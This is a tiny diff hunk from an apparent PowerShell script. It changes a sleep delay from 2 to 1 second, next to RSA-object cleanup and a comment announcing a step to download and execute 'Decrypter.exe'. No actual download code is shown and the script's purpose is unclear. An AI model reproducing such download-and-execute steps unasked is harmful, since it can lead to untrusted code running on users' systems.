@@ -112,7 +112,7 @@ $rsa.Dispose()
 
 # ---------------------
 
-Start-Sleep 2
+Start-Sleep 1
 
 # Download and execute the Decrypter
 $decrypterPath = Join-Path -Path $decrypterFolder -ChildPath "Decrypter.exe"
